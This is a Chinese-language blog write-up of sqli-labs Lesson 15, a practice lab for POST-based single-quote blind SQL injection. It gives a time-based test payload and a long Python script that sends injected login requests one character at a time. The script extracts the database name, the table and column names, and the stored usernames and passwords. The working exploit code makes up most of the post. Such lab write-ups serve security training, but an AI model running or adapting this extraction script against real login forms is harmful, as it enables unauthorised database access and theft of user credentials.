---
title: sqli-labs lession 15 POST单引号布尔型时间盲注
date: 2018-09-27 21:11:20
tags: [sqli-labs]
categories: sql注入
---
# sqli-labs lession 15 POST单引号布尔型时间盲注 #
---

## 登录界面 ##

![1](/img/sql/Lesson-15/1.png)

## 注入 ##

尝试各种姿势都不行,应该要用时间盲注了

### 判断类型 ###

`admin' and if(1,sleep(60),null)#`

测试出类型为字符型

![2](/img/sql/Lesson-15/2.png)

### Payload ###

构造好了之后就和Lesson-9一样了。

{% post_link sqli-labs-lession-9-GET单引号基于时间盲注 查看Lesson-9%}

### 脚本 ###

拿之前写的垃圾脚本改一改,跑下。(有空了把脚本改进下。)

	import requests
	url = 'http://10.60.250.66/sqlilabs/Less-15/'
	uname = ""
	db_name = ''#security'#数据库名
	db_len = 0#8 #当前数据库长度
	table_num = 0 #4#数据库表数目
	table_names = '' #数据表名
	table_lenlist = []#[6, 8, 7, 5] #数据表名长度列表
	table_namelist = []#['emails', 'referers', 'uagents', 'users'] #数据表名列表
	column_numlist = []#[2, 3, 4, 3] #数据表列数
	column_lenlist = []#[2, 8, 8] #列名长度列表
	column_namelist = []#['id', 'username', 'password'] #列名列表
	dump_numlist = []#[13, 13, 13] #字段数量列表
	db_payload = ''
	i = j = k = l = m = 0
	
	left = 97
	right = 123
	print("获取数据库长度")
	for i in range(1, 32):
	    uname = "admin'  and length(database())=%d # " %i
	    data = {'uname': uname, 'passwd': 'admin'}
	    res = requests.post(url, data)
	    if "flag.jpg" in res.text:
	        print("[+]数据库长度为:" + str(i) + "位")
	        break
	db_len = i
	
	print("获取数据库名")
	for i in range(1, db_len+1):
	    for j in range(left, right):
	        uname = "admin' and ('%s' = mid(database(),1,%d)) # " % (db_name+chr(j), i)
	        # print(uname)
	        data = {'uname': uname, 'passwd': 'admin'}
	        res = requests.post(url, data)
	        # print(res.text)
	        if "flag.jpg" in res.text:
	            db_name += chr(j)
	            print("[-]当前猜解:" + db_name)
	            break
	print("[+]当前数据库:" + db_name)
	
	#数据库中表数目
	print("获取表数目....")
	for i in range(1,100):
	    uname = "admin' and %d=(select count(table_name) from information_schema.tables where table_schema='%s') # " % (i, db_name)
	    #print(uname)
	    data = {'uname': uname, 'passwd': 'admin'}
	    res = requests.post(url, data)
	    if "flag.jpg" in res.text:
	        table_num = i
	        break
	print("[+]数据库表数目:", table_num)
	
	#数据库中表长度
	print("获取表名长度....")
	for i in range(table_num):
	    table_len = 0 #表名长度
	    #获取数据表长度
	    for j in range(1, 21):
	        uname = "admin' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1)) # " % (db_name, i, j)
	        data = {'uname': uname, 'passwd': 'admin'}
	        #print(uname)
	        res = requests.post(url, data)
	        if "slap.jpg" in res.text:
	            table_len = j - 1
	            table_lenlist.append(table_len)
	            break
	print('[+]表名长度：', table_lenlist)
	
	#数据库表名
	print("获取表名....")
	for i in range(table_num):
	    # 获取数据表名
	    table_names = ''
	    for j in range(1, table_lenlist[i]+1):
	        for k in range(left, right):
	            uname = "admin' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))=%d # " % (db_name, i, j, k)
	            #print(uname)
	            data = {'uname': uname, 'passwd': 'admin'}
	            res = requests.post(url, data)
	            if "flag.jpg" in res.text:
	                table_names += chr(k)
	                print("[-]当前表名猜解：", table_names)
	                break
	    table_namelist.append(table_names)
	print("[+]表名:\n", table_namelist)
	
	#数据列数
	print("获取列数...")
	for i in range(table_num):
	    #print(i)
	    column_num = 0
	    for j in range(1, 21):
	        uname = "admin' and %d=(select count(column_name) from information_schema.columns where table_name='%s') # " % (j, table_namelist[i])
	        #print(uname)
	        data = {'uname': uname, 'passwd': 'admin'}
	        res = requests.post(url, data)
	        if "flag.jpg" in res.text:
	            column_num = j
	            #print("[+]"+table_namelist[i]+"表列数:"+ str(column_num))
	            column_numlist.append(column_num)
	            break
	print("[+]数据表列数\n", column_numlist)
	
	#猜解列长度
	print("获取列名长度....")
	for i in range(column_numlist[3]):
	    column_len = 0 #列名长度
	     #获取列长度
	    for j in range(1, 21):
	        uname = "admin' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1)) # " % (i, j)
	        #print(uname)
	        data = {'uname': uname, 'passwd': 'admin'}
	        res = requests.post(url, data)
	        if "flag.jpg" not in res.text:
	            column_len = j - 1
	            break
	    column_lenlist.append(column_len)
	print('[+]user列名长度：', column_lenlist)
	
	#猜解列名
	print("猜解列名....")
	for i in range(column_numlist[3]):
	    column_names = ''
	    for j in range(1, column_lenlist[i]+1):
	        for k in range(left, right):
	            uname = "admin' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))=%d # " % (
	                i, j, k)
	            #print(uname)
	            data = {'uname': uname, 'passwd': 'admin'}
	            res = requests.post(url, data)
	            if "flag.jpg" in res.text:
	                column_names += chr(k)
	                print("[-]当前列名猜解：", column_names)
	                break
	    column_namelist.append(column_names)
	print("[+]users列名:\n", column_namelist)
	
	#爆破字段
	print('获取字段：')
	for column in column_namelist[0:]:
	    #print(column, '：')
	    dump_num = 0
	    #爆破各个字段数量
	    for i in range(30):
	        uname = "admin' and %d=(select count(%s) from %s.%s) # " % (i, column, db_name, table_namelist[-1])
	        #print(uname)
	        data = {'uname': uname, 'passwd': 'admin'}
	        res = requests.post(url, data)
	        if "flag.jpg" in res.text:
	            dump_num = i
	            #print(i)
	            break
	    dump_numlist.append(dump_num)
	print("[+]字段数：\n", dump_numlist)
	
	print('获取字段：')
	for i in range(len(dump_numlist)):
	    print(column_namelist[i]+":")
	    #####字段个数####
	    for j in range(dump_numlist[i]):
	        dump_len = 0
	        dump_name = ''
	        ### 字段长度 ####
	        for k in range(1, 21):
	            uname = "admin' and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) # " % (
	                column_namelist[i], db_name, table_namelist[-1], j, k)
	            data = {'uname': uname, 'passwd': 'admin'}
	            res = requests.post(url, data)
	            if "slap.jpg" in res.text:
	                dump_len = k - 1
	                break
	        #print(dump_len)
	        for l in range(1, dump_len + 1):
	            for m in range(32, 127):
	                uname = "admin' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d # "  % (
	                    column_namelist[i], db_name, table_namelist[-1], j, l, m)
	                data = {'uname': uname, 'passwd': 'admin'}
	                #print(uname+chr(m))
	                res = requests.post(url, data)
	                if "flag.jpg" in res.text:
	                    dump_name += chr(m)
	                    break
	        print('[+]', dump_name)


​	
​	
​	
​	
​	
​	
